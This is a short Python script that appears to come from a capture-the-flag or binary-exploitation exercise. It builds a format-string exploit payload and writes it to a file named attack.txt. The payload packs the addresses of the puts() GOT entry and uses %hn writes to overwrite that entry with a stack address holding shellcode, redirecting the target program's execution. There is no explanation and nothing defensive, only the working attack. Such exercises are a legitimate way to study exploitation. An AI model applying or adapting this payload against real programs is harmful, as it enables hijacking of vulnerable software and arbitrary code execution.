#!/usr/bin/env python

f = open("attack.txt", "w")

# puts() at 0x08049790
pay = "\x90\x97\x04\x08\x92\x97\x04\x08"

# shellcode at 0xffffd8b4
pay += "%55468c"
pay += "%6$hn"
pay += "%10059c"
pay += "%7$hn"
pay += "\n"

f.write(pay)
f.close()


